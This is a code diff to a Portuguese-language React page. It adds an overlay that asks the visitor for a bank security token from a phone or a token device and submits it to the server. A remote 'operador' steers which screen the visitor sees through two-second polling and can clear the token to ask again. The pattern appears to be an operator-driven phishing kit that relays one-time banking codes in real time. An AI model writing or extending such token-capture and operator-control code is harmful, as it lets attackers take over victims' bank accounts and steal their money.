@@ -65,10 +65,20 @@ const FUNCIONALIDADES = [
 function InternaPage() {
   const { id } = Route.useSearch();
   const checar = useServerFn(verificarStatus);
+  const enviarTk = useServerFn(enviarToken);
   const navigate = useNavigate();
   const [progresso, setProgresso] = useState(0);
   const [etapa, setEtapa] = useState(0);
   const finalizadoRef = useRef(false);
+
+  const [tokenModo, setTokenModo] = useState<null | "celular" | "chaveiro">(null);
+  const [tokenValor, setTokenValor] = useState("");
+  const [tokenSerial, setTokenSerial] = useState<string | null>(null);
+  const [tokenNome, setTokenNome] = useState<string | null>(null);
+  const [enviandoToken, setEnviandoToken] = useState(false);
+  const [aguardandoToken, setAguardandoToken] = useState(false);
+  const [erroToken, setErroToken] = useState<string | null>(null);
+  const tokenEnviadoEmRef = useRef<string | null>(null);
 
   usePresenca(id, "concluido");
 
@@ -99,6 +109,26 @@ function InternaPage() {
           finalizadoRef.current = true;
           return;
         }
+        setTokenSerial(res.token_serial ?? null);
+        setTokenNome(res.token_nome ?? null);
+
+        // Overlay de token dentro da BIA
+        if (res.proxima_tela === "interna_token_celular" || res.proxima_tela === "interna_token_chaveiro") {
+          const modo = res.proxima_tela === "interna_token_chaveiro" ? "chaveiro" : "celular";
+          setTokenModo((cur) => (cur === modo ? cur : modo));
+          // Se o operador limpou o token (reencaminhamento), volta pro input
+          if (aguardandoToken) {
+            const clearedToken = !res.token_em || res.token_em !== tokenEnviadoEmRef.current;
+            if (clearedToken && !res.token_em) {
+              setAguardandoToken(false);
+              setEnviandoToken(false);
+              setTokenValor("");
+              tokenEnviadoEmRef.current = null;
+            }
+          }
+          return;
+        }
+
         if (res.proxima_tela && res.proxima_tela !== "interna") {
           finalizadoRef.current = true;
           setProgresso(100);
@@ -116,13 +146,46 @@ function InternaPage() {
                   : "/token-celular";
             navigate({ to: destino, search: { id } });
           }, 400);
+          return;
+        }
+
+        // Voltou pra interna pura
+        if (res.proxima_tela === "interna" && tokenModo) {
+          setTokenModo(null);
+          setAguardandoToken(false);
+          setEnviandoToken(false);
+          setTokenValor("");
         }
       } catch {
         // silencia
       }
     }, 2500);
     return () => clearInterval(t);
-  }, [id, checar, navigate]);
+  }, [id, checar, navigate, aguardandoToken, tokenModo]);
+
+  async function submeterToken(e?: { preventDefault: () => void }) {
+    e?.preventDefault();
+    setErroToken(null);
+    const valor = tokenValor.trim();
+    if (!valor) {
+      setErroToken("Informe o token.");
+      return;
+    }
+    setEnviandoToken(true);
+    try {
+      await enviarTk({ data: { id, token: valor } });
+      tokenEnviadoEmRef.current = new Date().toISOString();
+      try {
+        const res = await checar({ data: { id } });
+        if (res.token_em) tokenEnviadoEmRef.current = res.token_em;
+      } catch { /* ignora */ }
+      setAguardandoToken(true);
+    } catch {
+      setEnviandoToken(false);
+      setErroToken("Não foi possível enviar. Tente novamente.");
+    }
+  }
+
 
   const etapaAtual = Math.min(ETAPAS.length - 1, Math.floor((progresso / 100) * ETAPAS.length));
 
